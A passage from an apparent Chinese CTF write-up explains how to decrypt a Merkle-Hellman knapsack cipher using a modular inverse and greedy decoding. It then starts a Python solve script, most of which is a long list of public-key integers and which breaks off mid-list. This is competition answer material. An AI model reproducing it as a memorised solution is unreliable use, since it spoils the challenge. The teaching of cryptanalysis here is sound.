mode=display">c=b_1*w_1+b_2*w_2+...+b_n*w_n</script><p><strong>解密过程</strong>:</p><p>已知w序列和A,n,c</p><p>先还原超递增序列：</p><script type="math/tex; mode=display">dp[i]=A^{-1}*w[i]\%n</script><p>再还原为放置dp中物品的结果</p><script type="math/tex; mode=display">c^{'}=A^{-1}*c\%n=b_1*dp_1+b_2*dp_2+...+b_n*dp_n</script><p>然后从大往小放物品，能放进去就放，对应1，不能放进去就不放，对应0</p><p>由此可写出解密脚本</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>A= <span class="hljs-number">367187063729057134458670306816733198994865430500824977627021301586930054694868237897970070000698346139383013078108488520964132927412683666958698914536505647</span><br>n= <span class="hljs-number">635168991317943435159754666823505482279835148175602254771842889892994859146945571126475943649598374496396785469538947630578660458757619928291685491504426719</span><br>w= [<span class="hljs-number">367187063729057134458670306816733198994865430500824977627021301586930054694868237897970070000698346139383013078108488520964132927412683666958698914536505647</span>, <span class="hljs-number">99205136140170833757585946809960915709895712826047700482199713280865250242790904669464196351798317782369240686678029411349605396067747405625712337568584575</span>, <span class="hljs-number">198410272280341667515171893619921831419791425652095400964399426561730500485581809338928392703596635564738481373356058822699210792135494811251424675137169150</span>, <span class="hljs-number">396820544560683335030343787239843662839582851304190801928798853123461000971163618677856785407193271129476962746712117645398421584270989622502849350274338300</span>, <span class="hljs-number">386515850915391102987778281699214138663839400888240574351931794452188589557258856348052735274879728317389571065844975607351682158778160083509588319919251684</span>, <span class="hljs-number">554012042259856074375253658697247397556400475292485292585730045000101855801126378697568977581535735445865877396599608315910674674435166277781229903991160986</span>, <span class="hljs-number">322126488835136719620339176057880776244352837503569492033082193469981545142992469950177564500107064552528770232646529399659386366580817526678756827133877598</span>, <span class="hljs-number">266761220295924072739442539758398829318096794090363778862276026681760624177211939672581008867202240153587135706317428240307900380256121847405553709376162933</span>, <span class="hljs-number">241089325399625894024600599832432000952198178340595250139525474283052757178280302828471738849540255987481039537476722325790005519321100371184700815091949977</span>, <span class="hljs-number">561073863705279495693562215145589142841005202975694546338906858769336480224309548934802424829991320346864479844321020588832649926381130307549590845720656577</span>, <span class="hljs-number">143561187975526552909688699633801417280222657596545633753111520885686522270987752459823508342683565001876282139572144285620869242131663895788582534122098970</span>, <span class="hljs-number">164461378932249994339054502696647314963331240439915363713561101652137911850732931589294648039579692036716008912361899700148429562921184067533991982611155481</span>, <span class="hljs-number">349386378361600835691463721262435096107134311124925884514275642417844516045672636136576821091879034802994623708583473444904440421206350286691771797762760079</span>, <span class="hljs-number">603543397195253374928519249681896847390686148571500133557688024416304915888881343225240540216061641193159723104301189886133816149876706967062454361389470298</span>, <span class="hljs-number">479101687197147621885192021554801557840740088104786831684398790143690219229778700193387996329174966339139175062237412912326727907760010519120921873941899439</span>, <span class="hljs-number">103819295893373124218058719837190868176812170894571729962109852571870130851650749346034453028844080222402909386797764856360491293138754676456263186397660278</span>, <span class="hljs-number">603684600245617745959544748373071769029986267393335180806146557992996557328861077893995893991865290404032168316099180278048760831517215416074830356464284243</span>, <span class="hljs-number">493547217419067757164224153825416608687517168477978470945272432109402208644719519268776033477818147339872563834734267214215077530153834481292027059436597655</span>, <span class="hljs-number">232150729650292140669031104187353612663251463014069599984772268982131600653406937872194178757196001702701628690879808838759131993535927523751995303861868330</span>, <span class="hljs-number">84813471132676248050169292996803266796654081767666512412702399303195453180825602238966631871663257208565550817969837539982446603459858363724477995553918083</span>, <span class="hljs-number">378827227467466177870419736689251750685507699375126458034881249484003247550016911632384907315331057605274273223062618224547047329745709770082160457739259488</span>, <span class="hljs-number">398365541489786036657286374207390281362772332771655204222749025328338482571637880525459034323020908560971312701881077415177157080211942443663546060860537625</span>, <span class="hljs-number">597969872769573176715327474826399930976545673689969542219987521092764655952824135583755830675781537299971056198600755073492407480373222155671963412979149083</span>, <span class="hljs-number">39500934952001000918511589074082516501759666002859899936719202796563035067431395466953137666880666091416391461886304544750084398288759313439438298526589647</span>, <span class="hljs-number">436811289540990968825737201984755058135426022488560687474578580600193908249639035637758774517460634316976693732309875668287341567158243071848248053320732520</span>, <span class="hljs-number">215125904192554066634270935222993593682543554196999639415014825922004113244915190206699233425747615313083230216788971084057460709532089307101145289690311479</span>, <span class="hljs-number">250088958591087490601022542857113151395414340964905565495213448718620762807725841544514126518390554686160766976616453840076145299113282659007743455959640526</span>, <span class="hljs-number">143416040794283699201818129349758031727112929176308811960136535712925503383091888047906704069223391804070836042357298080356677005423654036593221413054635015</span>, <span class="hljs-number">517643497147658249436078232577715519790528360545682823462613484112921888021804932628728771654534002811222130410753329269257350236862358873081393998190177897</span>, <span class="hljs-number">278748341634521561203427505936837308968373138453183695249092969707812107068483026470924219211419665034460569710183344859509770456896663408051202430548015866</span>, <span class="hljs-number">72012375235971331541454564312137254086001931062474986373232149014711773935726629643364533918979450193719048560039055303084077218341739018078553969623297956</span>, <span class="hljs-number">536470228780723932277374759995062056544403723371381122497691668964141711446190236733156232564971373721718164579087732009225966172731767955136846232506830978</span>, <span class="hljs-number">179414551524594140496704165714155833623213785860547514965918494275999296718377270639355066053434907151065394316581151495743345290165782149612012949738278329</span>, <span class="hljs-number">161762160966165086415825163203663111142811014707903063778083252400474982502050556791593911041461403023933629600217217174866429472268078412401694725382779659</span>, <span class="hljs-number">323551452000900130355929997947392090757105601509445733405739332085411158362177192964392225431815403304826805443355213717171171195895239873754407693173753661</span>, <span class="hljs-number">550831303662335631240204185615629414499250054358672740640952662249086870625156637087707222689675465091033905709025883650376874854456437810177212933451508864</span>, <span class="hljs-number">370030915220166383139205633055253303729598864118158403883564102924910216178264086091772632263623050041194177880423574354120798761999608572541817508483401829</span>, <span class="hljs-number">563578113795321225038750739440669957837617445365403622298550743096256368985158415006145822225578756255467539055786534804751897952276326885048567318225199971</span>, <span class="hljs-number">205701079406547261730428774857464299103786620928233874106205357690128982972754721111402827105077619707770566613800191435246997119335614896188765497463338055</span>, <span class="hljs-number">282215505960682877622087184226560019558441519149306726835374089645999991460299862365357933731997648460227836049552961940192474572513357090639798973195645211</span>, <span class="hljs-number">178963569550516965873209099762287457684486499040570747566284154085672080551564927258163507932481587038999316615080786962681294141906646823419027283141623791</span>, <span class="hljs-number">181822162672734342723463879185558491947725301678638094782673685457125655609601610489826092086985443744749727565944447452943381591405593659026162958979934610</span>, <span class="hljs-number">432757211543633093737472984635680803471155188505854636281985524489284950954913573996934144035389735996881832544300995208272774504417129334001167673629836889</span>, <span class="hljs-number">345587705577835876385921350793589727772779920171213930063390133314416663127088725680077296303364223459859334885941176763975725334756687585103657756162567352</span>, <span class="hljs-number">628003595124571654699963962477060230072270856324067052640640156121893268299607917108306471258281459020671955079326671769545205987529801358874750524484699989</span>, <span class="hljs-number">97393567320022964705410059645992848250741146920156605835456162509273724132186792355675684511253154687308043374897410087573617979485671581891837324797874263</span>, <span class="hljs-number">301903625614487107741723367855167867714246492574248714508552863376941521109382470104485933426862992937943493810597616973853698532282533973136205082434112160</span>, <span class="hljs-number">183699813798319405711839908335016206856562632061335278657667078099776207933791937123602150788794987085339165909303299537406698833273347219138533226987488695</span>, <span class="hljs-number">329614531594198077657580331906840040574443844325546333405023038975036164361217514916141097229243901386192277419491170510760542146431194854566382944334468349</span>, <span class="hljs-number">157422677547687872944885613717274026447520469062314017628771346197893481372721164220954289776007437218293082220931714479878528160563555417701523960024111381</span>, <span class="hljs-number">64894558853873249260158612385844364566736542741279373642697633073585582129361226070877537476363568165323141190770917659167861442111904579015060243641782393</span>, <span class="hljs-number">461731908964168458280284759182204296921853722151244493407255726196634852429348412110534503281607210161065971912556304395014655437475675218474350383720813419</span>, <span class="hljs-number">160447246233605185191617347652322151091530026362237002859968737169598383138008252113568671809818696577841550318057104266117526197104978105939996507222873193</span>, <span class="hljs-number">71326144589529173054422431359474237338432102242749898683714056237215011635978243347069276981471803797846468243199417481812363091298916027614836667660301249</span>, <span class="hljs-number">233797485702009648677928102807413749090942246398871708130428608162486695873557799445231644987065810839379107986714090159324156261856827364442241439722507530</span>, <span class="hljs-number">462627798917559715970249320135834391707340141958165814400944674888413971408173265953813004902887043001146355147834249537513498715433982665599514829298405363</span>, <span class="hljs-number">5969692108492977904319951153931265762960788118842055781143881792885664306188411774642277409912205076200361035471313398911600340477462687711026896655556607</span>, <span class="hljs-number">152395598603185382739561561586715970843541222814356418194846694296741698247313896095624668044889010845633863204582618013818094712767180189971915258418235452</span>, <span class="hljs-number">178872958368509176396861305596784820621725723257503660929530829866918057784043003646801033251563977019891704099285918267459328369549728207875695720490796571</span>, <span class="hljs-number">245981902327957547203027087682924865529172122647936443326132680120454374391002869360080411897574409662474898245873535915493328880181684715840922419378846537</span>, <span class="hljs-number">300368920699859285095578994192100768961844705259408021757131440774133763038969842804483478619254027102144062730652138779276193138259318585760258436039755668</span>, <span class="hljs-number">3283022954388150546219706177282711039519670138998619453332154033136869805273912233196658483245550830353468737127753600638642540183763273831279532986599707</span>, <span class="hljs-number">299593776174614204799352747973258227621044702941189500136891390457625014000516372737581596199551843325439699478987772359994183327752767973563908109363701566</span>, <span class="hljs-number">197756100327342786113951531122339471276578113297273099805112165725510484718829767122503721054973919802410012084231956568184102144587078707929364606424089143</span>, <span class="hljs-number">450468170176498679798419465783811690010890131107982378091500530003509603190959982441752635083076985949471922686418158324843409414457770982970451714982985336</span>, <span class="hljs-number">523679344583065559000452570080015395214930376814046601653378453540505426232162250382250890348632510762572701381338535324319460914380891306997480357939666589</span>, <span class="hljs-number">394847100263739403636759563948067491985819401668226890147255222600055626067879575210618566021270426818073081994464684140193524542194766824792639254899684667</span>, <span class="hljs-number">399132786888220776727859014977704499329920410971322796564474033761501540486621469243557058600585294276906968120735085372477446951932504418490022834984220884</span>, <span class="hljs-number">471383458162400506095730086348222685647798903015526934829094301094131413859360967402598403402481532023442668254081595115462896609509372786844145909189855512</span>, <span class="hljs-number">256323662360163426129133198327747460523724304594496675672911294704641654854820813494997057528773519615728453432343608897524790971603796558971508871493242752</span>, <span class="hljs-number">412084587635495377554183569820512817873291049022687717295082965557627361059219196850877430440158263481042732132032198859968267864415287358776174163726142055</span>, <span class="hljs-number">369786903379138525726656153308795837735602459462586022339450775284193448222731401781776263922585195464162067796071558839964285224449810825618861833590746040</span>, <span class="hljs-number">340278944121025682287127130895904442779032685905037175757974550697636391359834223848744395717721921099830385191502659638138442968831942777594223475987682283</span>, <span class="hljs-number">47384881032176509745326368707644600112417790989804160651733955936488736938179498169891907726769445135853201984884863019275009739060130972171672988098289454</span>, <span class="hljs-number">580982841256379134270584036581465227907819061009493956681485005855277773703982066377573387367403121708374373677240606638620678726165086661154851195980133263</span>, <span class="hljs-number">151021003624455996088627028616003147210139213566596876932716080403592089007607643443533762116485538623436167874966677504936240986540582348838632146680809478</span>, <span class="hljs-number">218245605427868919100275005624503823766526215738484065810227102988169086264066356642473019431793825766576850963361805257539814266779475749319333388551725389</span>, <span class="hljs-number">33973321436765616461082517187791318756449212127779703134615407435078407688650068530733042952719724960219073933421199069659994717370479216221335121280162540</span>, <span class="hljs-number">304948930147920679204236290363752775682382535843654275832795274771947287959131921623149285492003038416257410706519562644497672809839819395484779859368748900</span>, <span class="hljs-number">598898614083398983704423041859777657149832780113274981729464063535822034277831625359368441006726329360107881304434351713091750941983740450518355838166883336</span>, <span class="hljs-number">323278228442260108720063921128617996181541109799980652879571440672607400482835481830908203307688976359117069565446487659692031702792206580124285609691594811</span>, <span class="hljs-number">366085484375891846663353768837845465650031851660822356884896029582374424537931438767384348204512655828757605165054615432613549792585928273894991810238451685</span>, <span class="hljs-number">139570014761585899264203781778285887158108394458377691402497862748924319430001268175131572990168701878426627006900287892350740265375704773439043283126732946</span>, <span class="hljs-number">225601218942198374979151467721453867213870492004845437218529013156668298128754694577270028807519037008638626620899785095260788032019340376724788141507974423</span>, <span class="hljs-number">374302577059808698193987507469246923540867448197004435353898680685511364943285536562373347301568875913863334701514563134859314362086584977261940561485186062</span>, <span class="hljs-number">34048220966218586016244123209428854379073658299981236890218514473291445570632615705101428608597187984595389461907485694957695008257992118388581267165183757</span>, <span class="hljs-number">84194231824602550039330994397421332486477729062773282066141925089003561422149593336334406982167418803576333242724382574195650256370938181539320636420533291</span>, <span class="hljs-number">126437913299894501402407149120930345568461195515752331576410687261044720511118330917320582760028717693229569974442656225753326475656673002777624403720765495</span>, <span class="hljs-number">465969976251529371231149826509372790960682762671175106250230852250105974938989441754410094714864427920155578917504779451414994762051492699200411794502087926</span>, <span class="hljs-number">506883581402243389398783527500648352921737707377237134741560723799137132742518761235120000646216727119233119432842569630805683459812442129154355170046046029</span>, <span class="hljs-number">112831506872531765302052010187839201702906098449010326726342689137181677129178095724557999013088456343297660257430433180959618082464828509719667984781433473</span>, <span class="hljs-number">56264564878797778896641192851246881969753246815692051218037106456486010460445914061443664976779630993487465344522634066673399039982511822519067345096148503</span>, <span class="hljs-number">551573562416032472581208645039030181243877769280718300043871487324163745966831340934105419906100852186348592138099856634054132325944698556875488354214630709</span>, <span class="hljs-number">488255077358202660122224089347266845878398984719199180118076311336469844326030060686186894347272949069554914543502658046010315514198923214810025779179717201</span>, <span class="hljs-number">15098242071666335091577668112288263770908989334250740050995837159575755528713571427315832530142228271922519261339103226722171283275650744276954895532450775</span>, <span class="hljs-number">78784450953789709897980696684548014977742352174891852160533012048280167011110076619194107334631746814148458002977505157534864302416771735222491037797749546</span>, <span class="hljs-number">427354181050199019928271302145601276606758504170115689830985045366090479087886256983484452000076402276622116856414534104864734894244979498519431268009064350</span>, <span class="hljs-number">580049665597825729111981236084146562315401232218367572576230833981138043139650573592415668027485009319540372883499950005355644111128349570068925127267727842</span>, <span class="hljs-number">78338699545354045105856593070730555235226061182639821992149619345286315645115367513963371999528220538879238732312625924385168455092213044185211389256233800</span>, <span class="hljs-number">379547584449922139621947687807959558601266148128556429563887497081591163238977024414498504988125915976804567677866594149448284584709236132728342585440842836</span>, <span class="hljs-number">450111156059217125782121227089262408408731148049443345498756631256334027458633384027882365487943958058434600756703065576787886324993612059899114103607868226</span>, <span class="hljs-number">97625026999328653199069727470691631631174843584886770176061470677969614488151956693450512053915043423876715118792514118586283057339240109286792388000387310</span>, <span class="hljs-number">566247693403300395747547301424817832921925721604445171550637122997569165390790317805115673392013813599509433102303377697877227551440728257756029457140742179</span>, <span class="hljs-number">549807890161444749673219283685565230322686654213884711963676102321193287269571929726113273596635786697773142354182615717597728422830507346321499892684780309</span>, <span class="hljs-number">233904251671122455104451445034901809524055662451981736708765588652178850557321444500778803353168503938115696118103013845850242430986766094715237787267043335</span>, <span class="hljs-number">358962151327384067975831385888380713897889265806445828518596324656344612863212937750762115912049827236783710187900759151207083661112501806484616171686749292</span>, <span class="hljs-number">25498647995969783582792889295249748337833844517723527636823949017145847607243505060181988409349079026010126917511946565494210656706774012839827982047612942</span>, <span class="hljs-number">208789215381677026913193594988279808902268669704742699958481188421654691908863521495933032196926853305366198161303858825442382267277756266421033561788923110</span>, <span class="hljs-number">402653451988507653871969660007226857851202252210397735273269064903190091090605634676460459224835208840018688558567180685404523101377989923730923789432985990</span>, <span class="hljs-number">175964867016919425760426726556606344638096706410393588003209215494545459390116026642363461902330314576830779696611541567192787787083349495241843949239058309</span>, <span class="hljs-number">90586908156741969093118963471118854780026429654122996246530285692410679739218517246090082863706896326737553159453219191309037991074927958057170355395052821</span>, <span class="hljs-number">520348169264554561660212074918303165655296937780301614623328614473929477561962195566014665763080845364714870753534312821385659623304586331180440729570539004</span>, <span class="hljs-number">201501714039848061893318858028324206444768934056944130767883685174345218513484678407396609161333202821262556549829210289186938766227889254380451318981081733</span>, <span class="hljs-number">354393073090826651080622645558628343930312580780342462767786557813994665643411198154597274861282026978770135717937372271947719295904990657000693613637783351</span>, <span class="hljs-number">483376330854297767200413925393386432152938703054416123323723909236247934163807750841874934551911276380337888956067448226119570470841958721634278061251905008</span>, <span class="hljs-number">328107143385209543248726616382835779549348060508802200338889188661762634513456372162672710843644545709176126090515544919935019803552706184309168114867081073</span>, <span class="hljs-number">87562123737145635405260974921958231202660548327871274920370307967034020866123427461178193295226110139034480484002360575597663482291565032243046575785472579</span>, <span class="hljs-number">542767184755051504914452570538480632730536790311942708412964848806883120112868257654170280712328058472208177465917068075187098863226414137747047501636053360</span>, <span class="hljs-number">492602912953825210865783877195125154541463697072413093846765455940063422893734138802108524313792072568947840390820953489596772737447969545005551742422145357</span>, <span class="hljs-number">21992973941153860226287015675875812836869174202579177399037244867139304968799457042616926803407286604072218748985162731811236910990455733424135319552369617</span>, <span class="hljs-number">434753631710911306908057917461979410328377644814197092695091872810806230303035121829429307861751509727680156471684354722455920740169441354197925075022428792</span>, <span class="hljs-number">585755699301967669838437785021359214054135886195682886115610345679203139096649717383053432492483172619062041561522189957689683963093600973084089729765437126</span>, <span class="hljs-number">470720180119522628274059358554923079120561874268300676770594812238383462430716934372191660472952767439054934709424283455173284836143035828240273463240124527</span>, <span class="hljs-number">436316358860353620387723358170891436124309476446614479878845987060494525075862344026694385368438228907945269407523091050200786213229956312028886816770341031</span>, <span class="hljs-number">247616171627450088615612909421234657398581284691507138080821504731255557591071929336138421428595767090766667677012403584474281026171871273483575320700002422</span>, <span class="hljs-number">554110469629113828561459035309196443613786524604013681186384497469180333678428631663919742578729159186673909768677935006633280626358811005039714068138773305</span>, <span class="hljs-number">590102255659359164867091681903615252653577018563351972787453070152336918960953166308768020944303596595737922431412105099717039087474771300872891602182992432</span>, <span class="hljs-number">198809036697306983673229803388106874830752011142102317858191240531321200476682046028708868437654948633880388094380522120058052717718347453216958543661846548</span>, <span class="hljs-number">614867489167737799504685822947320498205057881881084793135823661740798776222433865749247481811684300742376528043872022941573281400649035485161588593346791852</span>, <span class="hljs-number">603610692789626857068276682577789547052399315090148020424165310612029867288702187958781622452540141989210224199160438920581339716521601352915912094766458059</span>, <span class="hljs-number">533848654727972192880850260003473919308899002607289124917830500539630840863548514372791130575300403650509135579150439076080509749088873136428467624292200054</span>, <span class="hljs-number">157810302627436713556471902420625049274348586555970114801355485080978648233618180919226850548471262183478502668923857558215391569446126215697127142557281515</span>, <span class="hljs-number">60030659033636101562514397560626266610931659424905623011938393646100009933248204380292718877422915636082906228088673243629302860458746646815725901905867747</span>, <span class="hljs-number">257211606348159700720339890972799097752768674922799248232024456848576583384008214667737672498799155464697698899257775996778624129701733139241889452126631038</span>, <span class="hljs-number">18449021612186905808595957800393127980803223234013638264438430132652231647641996251531655866671794180220763877502294041802292645059515450163706698523077672</span>, <span class="hljs-number">268919778892235521942459176637133055608077492256155260651803520465449633353669248151753820663227247723767238942827319903912266423005501737923009204107131697</span>, <span class="hljs-number">98665257814115881283147218769780657260068944080399427622547242688245243155173156766927177207354869914683122797314593231669104030924821907370543594194278370</span>, <span class="hljs-number">191870417300843331658605539644297182030870888227716710449370361645451892112938944756604164388153204295489958680650439587329075717138203926054109527404804661</span>, <span class="hljs-number">311419024517184455366082662817116819537427582668577602580444121372694439727783453653026207540262208021366720946133718947766697740743653223298493256396708966</span>, <span class="hljs-number">77088351423504059628952927976104362307258831980589548567251166541773926714247749432398812053336079350797343210805089693401183991171041866586596581240618870</span>, <span class="hljs-number">105730897292335220148004150005473169181234929185554062244251282002275223144510624110377482868227894369027124274710901581478510618132264093137690322982064215</span>, <span class="hljs-number">17872203464582103950106720589684582512981012656368312745364796977436722280482466273448256894844065738635805120615140776315368202533384363712660692795724140</span>, <span class="hljs-number">489422784348001825673472311433115664582380231403582300274575143571226189755826234866316424888992309150442264468166080136342603896061849610177150839519592630</span>, <span class="hljs-number">170551836074928737264446513282791952271789419043458830725606115432115690460892614513912760323046237317973707582817666653872902745836328943181224925417182562</span>, <span class="hljs-number">132318057843379132183381325765716808685727825010840651317040985119925776165512156117201261579612826922462539401081566644153160141882245190503733307151119952</span>, <span class="hljs-number">544994533591946987585747723839432159893067090991165378757423098834894152257326564602066880492748130985623755099929124743094655325565366115773754635813514906</span>, <span class="hljs-number">197307208736780317990542112450663682341631338044433240061552441358856174171962734312779181632586574912491795183498460456183886862922411616671324684333148662</span>, <span class="hljs-number">512019186678746145980396028875474072206958894189767836632643091871343706360595576575360240124189875582270902606279008873884014172211790587584538894327506266</span>, <span class="hljs-number">41008260369554712363470132719575901159953831033493963834374109741906210391553634452063999254970872541033643513166584168724636441254416713661050970146563465</span>, <span class="hljs-number">288648541420058562486145212987560479176385673364462680572070158090939855167345918791944289839094010374422012094197998966242878488054386505830583190830435262</span>, <span class="hljs-number">438795736646530312767227445830718466925673847594348557019383147559789230773357238580159140586872530658671392178456326995886613392550447065554951020373466250</span>, <span class="hljs-number">227614551910199920609765797179008449371476572229603502451766179580938379852556458112077278501152822481759922199989381349202963004822797067985089861216312247</span>, <span class="hljs-number">610528494532146741884356298489263038325032873274217303692483727471950423556822402748518246517451240843228261554683335032219201069262320657691151436638082871</span>, <span class="hljs-number">401836272495697336953809607296578158426965922910827784569073449592223658962932586401328803861799066472744747460874685280446117611155938713312366089330547838</span>, <span class="hljs-number">192746946198121048119110092709363468534289914152688167474023881921488915126583175420021793831808020865689336691055665588082121521805768204950411417211624460</span>, <span class="hljs-number">149081114026537312696105441651058028238810334750903810490941646772859050872220802216040592720871929405169094859363855367905567370883042735507090763428167511</span>, <span class="hljs-number">437777546780939541774077587656330781243150477875985179988138442488069007470767777987183976997000409233547870721973136494259159735335584809852714891556112865</span>, <span class="hljs-number">158357362221359482961972288271670112261162454842298198379022472514724757865766798335714197025485403861749062207143684089583024827975381457820873145127193016</span>, <span class="hljs-number">420953580119286377286010366758431651175444002765611848935141632252891554540600674926620481140739590383609823958309117888148001690512339173563480272999961545</span>, <span class="hljs-number">405437019822473855344067858462439426687781522181348798986982187706388543184852279704956421536163592418960950485564760536110995644449996312898657948497940616</span>, <span class="hljs-number">218250880124314241753087089995871477860380483044446898557477492659591176887840904770854695853141713855243233184827571900007040252964635990335965343808640720</span>, <span class="hljs-number">485251652896419712773053686329900727015656148000065999448782293005745106754598745080589312281963649774035936187786927244519782802097409992494270814502120228</span>, <span class="hljs-number">192669105483896829896412414370517151226520451186406522736162526337955356864432242485749296334801206532142657302597805229813436179646896088336652555928752002</span>, <span class="hljs-number">515524617123249684483048800525917075690219140112304495426380576138464303325211157771517619038961481202580654852675188167541370074892233351288221673906396623</span>, <span class="hljs-number">327366903438973063179815457961149771654747388318185008998265766937512758922733074793389896163309715983689704486960398217316690456180243294472647411384220304</span>, <span class="hljs-number">495939514439860675862659327002967368864258786940195982203407708871993930927198466331818956294170488601878808607276081193983946798552754048262265657094822959</span>, <span class="hljs-number">316636554423443044421695011555180549831983473034069776006699331499809457269776762594455359761013258316596018705682928508655225305900779723355763492720073686</span>, <span class="hljs-number">361511259122881827009007196225120107934975341815458954065751526192169546436868100152880756732231048279423670417054643905527823918755318060643316256348500236</span>, <span class="hljs-number">237808167721685731743666988686773393907480136754193865053002908572689490075775754922029728479096366533995180350456955132194424721418708506670161646899526214</span>, <span class="hljs-number">302571344355868474032637061485452597087033341839014378884506581459080048492135053912043810274237278212512481963966999305470667917651048048753769115670796273</span>, <span class="hljs-number">539225004825911014710802471825423015038267989886592655821089661308670565266814533122237541666628963239926837412489692072300860209359830336702320409860194620</span>, <span class="hljs-number">80322246769731822319875641137718270613004672267489551587458425933015762892838937992156485046360581013208965510924271575629047002668052046321698321395665847</span>, <span class="hljs-number">407905642850897688568410606755704306378622411801588505613744926646151445031561871518931517115186427833704505366734130470662590969473196555574749070394295075</span>, <span class="hljs-number">582593493721202450832609592406387621703371030044251878352689875028404224361137142961039499547056002467418975004768724367212894609714895414881659435434888382</span>, <span class="hljs-number">406686034943698211939320843731240278525156658610148640979217067897765137519089944677877220915721679378628187446970311220083751418930197067129897162929879139</span>, <span class="hljs-number">147577811618678727093699739005675984188093577788056114494168756219210464632915546894596798228953150219655381238353004936101642105061166947138574298091985167</span>, <span class="hljs-number">244040318009534892234329829458414159895496091014413577234183902554627423452233132178371220129182424186782416776216278638453358903061821320988748570191412773</span>, <span class="hljs-number">139360396071879071679724427132804103561927151350775096055566373226149530775534046534108277981974845311632451526601347752392692407161189152493399092497753664</span>, <span class="hljs-number">284361493176968596385254999799147141910625912225998148149850839943884956433805517914402124989786807349232024647590745994677790605710768698265579096259526152</span>, <span class="hljs-number">366197727275880435950745916488273913597146674508285149836083757495440369418145285320941448220263980744716752102395682567625247149168596940206553925980728330</span>, <span class="hljs-number">422254466064316104643423205614737085261229080957463505541859958450022329655964646407653584045660022599424702917924337288720650978914947820127737648892835450</span>, <span class="hljs-number">49403668378011099962186656633709540665147600567223896654861254704385215549350870173405133654895785091498994144695675318396292028609456128848397530541606030</span>, <span class="hljs-number">139809008374366977754772511487972684678451948315958678206533906107250809073910292736461039987641749902659516891786177790404158840364977383081408023436645965</span>, <span class="hljs-number">521501888556574066491760747665048621840638980783725623277929775164130195690130512859861276922234001335010033740192435750978419722362625246275422707776061855</span>, <span class="hljs-number">561957387746562908992171597134088784700271286345571370215994787946707758458984061774140461067198642150581273705963064115457108076338988212461898352716650542</span>, <span class="hljs-number">463955355314762971958704741524935151237141155468382380178984938221980444852786256481788588749318332930249361588475117631712372286939563243392102401667610157</span>, <span class="hljs-number">297682434795281626173654579303461625662797901761204034810735062215005881537385866547357553542034413901438985620510587187846145248534858233897387779208886896</span>, <span class="hljs-number">613779496331296492820464921371032350686196825928358116740540500878813910070637213553063401794278058313721888944570187643950733721847761018346786223846260819</span>, <span class="hljs-number">351134285153706201016326045832091989058541253147517266910361146928719592423296531385573475130070205100326872606790490306925617703143619077237257962640875458</span>, <span class="hljs-number">109858190971831628449730761079593596914989405264961941668061641948811355145617145062994940361966470852888431588352445190726407229472351421915655775010815178</span>, <span class="hljs-number">387432627150122431854813766757947603872861355736134176542255691485670282913121395157248372297526925413210420930852910948784104256868940125774002840184809996</span>, <span class="hljs-number">138324121665728441736619681402808980600065608832763883686183569307390729589267940463559994197456899334118809421521975928392119702615074558255136607085779728</span>, <span class="hljs-number">387621026414796359977394215070771516511270669387878185984758959537508545537209823200342888274399156160507221446755188914407296888054365099981674045036502053</span>, <span class="hljs-number">595047254179332902517892421013638482120939739553572769898601311115185757344408717037356566480055152125182314856493774288290211383481363883588070508637877729</span>, <span class="hljs-number">231726259552249122186290741142571330944610257183552995273359694322262945694901150100521095377438288979331176841857660225665290610113578800043457482908766270</span>, <span class="hljs-number">6014577468336832924246179884748312095698249011941851807683714902989065382168718896842098646840344044265000463058268376228230485493358525483861683081281169</span>, <span class="hljs-number">335939423092992544217818746003882405500391275605373962211245271990577721944612434454141296418350686199886161872711415342702285671039355762968696366991995627</span>, <span class="hljs-number">189357507059040995660667967311052572009132589158888341861473573527604550716958987561222000220840459662294423517455611106440949699271757760705425184722330017</span>, <span class="hljs-number">147956446690856791533399201923823016003867752795524293867231656773944155149152164719733630930991656382517664456593493018234492586949278572150097726850167203</span>, <span class="hljs-number">66065741548210375911973499673197000303255811672920709908243279332408190036301699896722642968083869004876904061501799837695312681101184210476229075350529459</span>, <span class="hljs-number">545577965595331403102030208658045677499451404147027114349009383543178894017175871855444892971357317198536330907218300517447261466819718199453537679675412478</span>, <span class="hljs-number">560999890043718197795477280781161748749440999767139072760846807753366909539164261638126435931754943236972679973105405308415826312600524088881915028942970487</span>, <span class="hljs-number">394609435487783182698654275332518575520592391784843091554775669743128274733903855551797849105026993643562788927530326649831666619941760202499682586929220220</span>, <span class="hljs-number">609949810268714921505705099039934396537474886676219173422283617216996130204722868052957228605994495177153948986702825456021266252047515078598887073482499983</span>, <span class="hljs-number">527081776876287292860222295430017356892247431699031853813011144173648904294324270414784742949154266922962058113358690298755465302481287450916461282402326465</span>, <span class="hljs-number">317000031152511129378100635943250410235256830827267330797365953915598038681544747744945937673339112880702833151730417289799504021158998267126097107786257755</span>, <span class="hljs-number">301464625391817390203524693694409942867307123253338975065670792929144649503419480226863238092056414601738188022093849472003808437154826626144068855366017867</span>, <span class="hljs-number">426361274143546490059278037562560012702732744860858782304538603383466466864086980321597386433478340511561705882292900266170760823479349289401652395080551735</span>, <span class="hljs-number">210010985247667274472304468321630013122711035092132807387660086026755791895866224737872131962023406453119025553741602238690882876837798741549759681992560599</span>, <span class="hljs-number">393950716444670567332344322898309168339950896396461090195465228208772733048927752798195742572179631075584073883125712394344239234199171875784256887857476812</span>, <span class="hljs-number">130814939999561438842216623967560102299300706179414570437642630348990099876381195637106899397577104330631600839156032767474121997773125923484007625226715252</span>, <span class="hljs-number">279921672240614181163288380433125326992890082190902298743090054421584419055698458485375953932516091663468557375418205527774177812678253069939095289083278710</span>, <span class="hljs-number">161293438560931305928591007866598206472158158444643128635190304553013875708533261794522416792417059660175781422289511879139119783498614733998790034526623432</span>, <span class="hljs-number">232006518889823987284052893120310913668276274040218344518566329799452329514201219390250939503302683080230684500129261583546015939053711093777177162238155054</span>, <span 